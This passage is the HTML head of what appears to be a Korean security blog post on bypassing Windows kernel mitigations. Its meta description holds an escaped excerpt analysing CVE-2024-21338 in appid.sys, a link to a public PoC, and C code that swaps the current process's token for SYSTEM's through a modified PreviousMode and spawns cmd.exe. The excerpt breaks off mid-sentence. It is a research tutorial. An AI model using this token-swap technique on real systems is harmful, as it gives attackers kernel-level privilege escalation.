

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/&#34;&gt;Bypassing Windows Kernel Mitigations: Part1 - Overview&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338 &amp;#x2190; Now&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, L0ch&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xB2EC; Windows Kernel Mitigation&amp;#xC744; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xB294; Part 1&amp;#xC5D0; &amp;#xC774;&amp;#xC5B4; Part 2&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC654;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xBD80;&amp;#xD130;&amp;#xB294; kCFG &amp;#xC6B0;&amp;#xD68C;&amp;#xC5D0;  &amp;#xB300;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBCFC;&amp;#xAC74;&amp;#xB370;&amp;#xC694;, 2024&amp;#xB144; 2&amp;#xC6D4;&amp;#xC5D0; &amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xC5C8;&amp;#xB358; appid.sys&amp;#xC758; Local Privilege Escalation &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; CVE-2024-21338&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA70; kCFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD558;&amp;#xB294; &amp;#xC138; &amp;#xAC00;&amp;#xC9C0; post-exploitation technique&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;h2 id=&#34;CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference&#34;&gt;&lt;a href=&#34;#CVE-2024-21338-appid-sys-Untrusted-Pointer-Dereference&#34; class=&#34;headerlink&#34; title=&#34;CVE-2024-21338 - appid.sys Untrusted Pointer Dereference&#34;&gt;&lt;/a&gt;CVE-2024-21338 - appid.sys Untrusted Pointer Dereference&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xBD84;&amp;#xC11D; &amp;#xBC0F; exploit&amp;#xC740; Windows 23H2 build 22631.2861 (2023&amp;#xB144; 12&amp;#xC6D4; &amp;#xB204;&amp;#xC801; &amp;#xC5C5;&amp;#xB370;&amp;#xC774;&amp;#xD2B8; &amp;#xC801;&amp;#xC6A9; &amp;#xBC84;&amp;#xC804;) &amp;#xC5D0;&amp;#xC11C; &amp;#xC9C4;&amp;#xD589;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CVE-2024-21338 &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC790;&amp;#xCCB4;&amp;#xB294; &amp;#xAC04;&amp;#xB2E8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%201.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;appid.sys &amp;#xB4DC;&amp;#xB77C;&amp;#xC774;&amp;#xBC84;&amp;#xAC00; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC628; I/O Reqeust&amp;#xB97C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C;, IOCTL Code&amp;#xAC00; &lt;code&gt;0x22A018&lt;/code&gt;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;AipSmartHashImageFile&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xBC84;&amp;#xD37C;&amp;#xC778; SystemBuffer&amp;#xB97C; &amp;#xD568;&amp;#xAED8; &amp;#xC804;&amp;#xB2EC;&amp;#xD558;&amp;#xC5EC; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%202.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AipSmartHashImageFile&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB294; &amp;#xC774;&amp;#xD6C4; &lt;code&gt;AppHashComputeFileHashesInternal&lt;/code&gt;, &lt;code&gt;AppHashComputeImageHashInternal&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C; &amp;#xCCB4;&amp;#xC778;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xCD5C;&amp;#xC885;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;AppHashComputeImageHashInternal&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;SystemBuffer+0x16&lt;/code&gt; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC758; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC81C;&amp;#xC5B4; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; SystemBuffer&amp;#xB97C; &amp;#xCEE4;&amp;#xB110; &amp;#xCEE8;&amp;#xD14D;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C;, &amp;#xC720;&amp;#xC800;&amp;#xB294; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xCF5C;&amp;#xBC31; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB97C; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.(&amp;#xBE68;&amp;#xAC04;&amp;#xC0C9; &amp;#xBC15;&amp;#xC2A4;) &amp;#xAC70;&amp;#xAE30;&amp;#xC5D0;, &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xC778; rcx&amp;#xB97C; &amp;#xCC38;&amp;#xC870;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;(&amp;#xD30C;&amp;#xB780;&amp;#xC0C9; &amp;#xBC15;&amp;#xC2A4;) &amp;#xAE4C;&amp;#xC9C0; &amp;#xC81C;&amp;#xC5B4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC8E0;.&lt;/p&gt;
&lt;p&gt;&amp;#xC790;&amp;#xC138;&amp;#xD55C; &amp;#xBD84;&amp;#xC11D; &amp;#xBC0F; PoC&amp;#xB294; &amp;#xC544;&amp;#xB798; &amp;#xB808;&amp;#xD37C;&amp;#xB7F0;&amp;#xC2A4; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD574;&amp;#xC8FC;&amp;#xC138;&amp;#xC694;!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp&#34;&gt;https://github.com/hakaioffsec/CVE-2024-21338/blob/main/poc.cpp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/&#34;&gt;https://hakaisecurity.io/cve-2024-21338-from-admin-to-kernel-through-token-manipulation-and-windows-kernel-exploitation/research-blog/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xAC8C; &amp;#xB410;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xD55C; &amp;#xC258;&amp;#xCF54;&amp;#xB4DC;&amp;#xB098; ROP &amp;#xAC00;&amp;#xC82F; &amp;#xB4F1;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD560; &amp;#xC218;&amp;#xB294; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.  &lt;a href=&#34;https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/#kCFG-Kernel-Control-Flow-Guard&#34;&gt;part1&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xB4EF;&amp;#xC774;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CPU&amp;#xAC00; Supervisor Mode(ring 0) &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC720;&amp;#xC800;&amp;#xB79C;&amp;#xB4DC;(ring 3)&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xB294; SMEP&lt;/li&gt;
&lt;li&gt;&amp;#xBE44;&amp;#xD2B8;&amp;#xB9F5;&amp;#xC5D0; &amp;#xB4F1;&amp;#xB85D;&amp;#xB41C; &amp;#xCEE4;&amp;#xB110; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xC608;&amp;#xC678;&amp;#xB97C; throw&amp;#xD574; &lt;code&gt;KERNEL_SECURITY_CHECK_FAILURE&lt;/code&gt; &amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; kCFG&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xC704; &amp;#xB450; &amp;#xAC00;&amp;#xC9C0;&amp;#xC758; mitgation&amp;#xC758; &amp;#xC874;&amp;#xC7AC; &amp;#xB54C;&amp;#xBB38;&amp;#xC774;&amp;#xC8E0;. SMEP&amp;#xC740; bypass &amp;#xAC00;&amp;#xC82F;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD574; &amp;#xC6B0;&amp;#xD68C;&amp;#xD55C;&amp;#xB2E4;&amp;#xACE0; &amp;#xD574;&amp;#xB3C4; &amp;#xACB0;&amp;#xAD6D; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xCF54;&amp;#xB4DC;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; kCFG&amp;#xC5D0;&amp;#xC11C; &amp;#xB9C9;&amp;#xD600;&amp;#xBC84;&amp;#xB9AC;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;Token Swapping&amp;#xC744; &amp;#xD1B5;&amp;#xD55C; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC774; &amp;#xC8FC;&amp;#xC694; &amp;#xBAA9;&amp;#xC801;&amp;#xC778; &amp;#xCEE4;&amp;#xB110; Exploit&amp;#xC740; &amp;#xCEE4;&amp;#xB110; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; &amp;#xC77D;&amp;#xAE30; &amp;#xC4F0;&amp;#xAE30; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xC5BB;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC911;&amp;#xC694;&amp;#xD55C;&amp;#xB370;&amp;#xC694;, kCFG&amp;#xB97C; &amp;#xB9CC;&amp;#xC871;&amp;#xD558;&amp;#xB294; &amp;#xCEE4;&amp;#xB110; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; Full Arbitrary Kernel Read/Write &amp;#xD504;&amp;#xB9AC;&amp;#xBBF8;&amp;#xD2F0;&amp;#xBE0C;&amp;#xB97C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xC138; &amp;#xAC00;&amp;#xC9C0; Exploit Tech&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PreviousMode&lt;/li&gt;
&lt;li&gt;SeDebugPrigvileges&lt;/li&gt;
&lt;li&gt;I/O Ring Buffer&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;del&gt;&amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC704; &amp;#xC138; &amp;#xAC00;&amp;#xC9C0; &amp;#xAE30;&amp;#xBC95;&amp;#xC744; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/del&gt; &amp;#xB9C8;&amp;#xAC10; &amp;#xC774;&amp;#xC288;&amp;#xB85C;,, &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; PreviouMode&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C; exploit&amp;#xB9CC; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xACE0;, &amp;#xB2E4;&amp;#xC74C; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; SeDebugPrivileges&amp;#xC640; I/O Ring Buffer&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C; Exploit&amp;#xC744; &amp;#xB2E4;&amp;#xB904;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD560;&amp;#xAC8C;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;EXP-1-PreviousMode&#34;&gt;&lt;a href=&#34;#EXP-1-PreviousMode&#34; class=&#34;headerlink&#34; title=&#34;EXP 1 - PreviousMode&#34;&gt;&lt;/a&gt;EXP 1 - PreviousMode&lt;/h2&gt;&lt;p&gt;&amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8;&amp;#xB294; PreviousMode &amp;#xBCC0;&amp;#xC870;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode&#34;&gt;PreviousMode&lt;/a&gt;&amp;#xB294; KTHREAD &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD544;&amp;#xB4DC;&amp;#xB85C;, &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xC560;&amp;#xD50C;&amp;#xB9AC;&amp;#xCF00;&amp;#xC774;&amp;#xC158;&amp;#xC774; &lt;strong&gt;Nt&lt;/strong&gt; &amp;#xB610;&amp;#xB294; &lt;strong&gt;Zw&lt;/strong&gt; &amp;#xBC84;&amp;#xC804;&amp;#xC758; &amp;#xB124;&amp;#xC774;&amp;#xD2F0;&amp;#xBE0C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xACBD;&amp;#xC6B0; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC;&amp;#xC758; &amp;#xB9E4;&amp;#xAC1C;&amp;#xBCC0;&amp;#xC218;&amp;#xAC00; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC654;&amp;#xC74C;&amp;#xC744; &amp;#xC54C;&amp;#xB9AC;&amp;#xB294; &amp;#xD50C;&amp;#xB798;&amp;#xADF8; &amp;#xAC12;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. PreviousMode &amp;#xAC12;&amp;#xC774; 1&amp;#xC774;&amp;#xBA74; &amp;#xD604;&amp;#xC7AC; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC; &amp;#xAC1D;&amp;#xCCB4;&amp;#xAC00; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &amp;#xC0DD;&amp;#xC131;&amp;#xB418;&amp;#xC5C8;&amp;#xACE0;, 0&amp;#xC774;&amp;#xBA74; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC0DD;&amp;#xC131;&amp;#xB418;&amp;#xC5C8;&amp;#xC74C;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC8E0;. &amp;#xC774;&amp;#xB294; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC628; &amp;#xAC1D;&amp;#xCCB4;&amp;#xC758; &amp;#xCEE4;&amp;#xB110; &amp;#xC811;&amp;#xADFC;&amp;#xC744; &amp;#xC81C;&amp;#xD55C;&amp;#xD558;&amp;#xB294; &amp;#xC5ED;&amp;#xD560;&amp;#xC744; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; PrevousMode&amp;#xB97C; 0&amp;#xC73C;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; &lt;code&gt;NtWriteVirtualMemory&lt;/code&gt;&amp;#xB098; &lt;code&gt;ReadProcessMemory&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD574; &amp;#xCEE4;&amp;#xB110; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; RW &amp;#xD504;&amp;#xB9AC;&amp;#xBBF8;&amp;#xD2F0;&amp;#xBE0C;&amp;#xB97C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;, &amp;#xC774;&amp;#xD574;&amp;#xB97C; &amp;#xB3D5;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC81C;&amp;#xC640; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;defines.h&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xc0000004&lt;/span&gt;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;GetNtFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{...}
&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PULONGLONG objptr, ULONG pid, HANDLE handle)&lt;/span&gt;&lt;/span&gt;{...}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
	PVOID KTHREAD = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID SYSTEM_EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

	ULONG dwbytes = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();
	
	&lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&amp;amp;KTHREAD, pid, hThread);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current KTHREAD: %p\n&amp;quot;&lt;/span&gt;, KTHREAD);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&amp;amp;EPROCESS, pid, hProc);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current EPROCESS: %p\n&amp;quot;&lt;/span&gt;, EPROCESS);

	GetObj(&amp;amp;SYSTEM_EPROCESS, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] System EPROCESS: %p\n&amp;quot;&lt;/span&gt;, SYSTEM_EPROCESS);

	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;modify previousmode in windbg and press any button..\n&amp;quot;&lt;/span&gt;);
	getch();

	&lt;span class=&#34;hljs-comment&#34;&gt;// [2]&lt;/span&gt;
	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt; , (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);

	&lt;span class=&#34;hljs-comment&#34;&gt;// [3]&lt;/span&gt;
	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);
	
}&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xC804;&amp;#xCCB4; &amp;#xC18C;&amp;#xC2A4;&amp;#xCF54;&amp;#xB4DC; : &lt;a href=&#34;https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c&#34;&gt;https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xB3D9;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;NtQuerySystemInformation&lt;/code&gt; API&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C; leak &lt;/li&gt;
&lt;li&gt;&amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xD1A0;&amp;#xD070;&amp;#xAC12;&amp;#xC744; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB85C; overwrite&lt;/li&gt;
&lt;li&gt;&amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xAD8C;&amp;#xD55C;&amp;#xC758; cmd &amp;#xC2A4;&amp;#xD3F0;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC778; &amp;#xC2E4;&amp;#xD589;&amp;#xC774;&amp;#xB77C;&amp;#xBA74; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB294; &lt;code&gt;pNtWriteVirtualMemory&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCEE4;&amp;#xB110; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; RW&amp;#xAC00; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC544;&amp;#xBB34; &amp;#xC77C;&amp;#xB3C4; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;..&amp;#xB9CC;! &amp;#xC6B0;&amp;#xB9B0; &amp;#xC774;&amp;#xC81C; &lt;code&gt;pNtWriteVirtualMemory&lt;/code&gt;&amp;#xD638;&amp;#xCD9C; &amp;#xC804; &amp;#xB514;&amp;#xBC84;&amp;#xAC70;&amp;#xC5D0;&amp;#xC11C; PreviouMode&amp;#xB97C; &amp;#xC218;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; 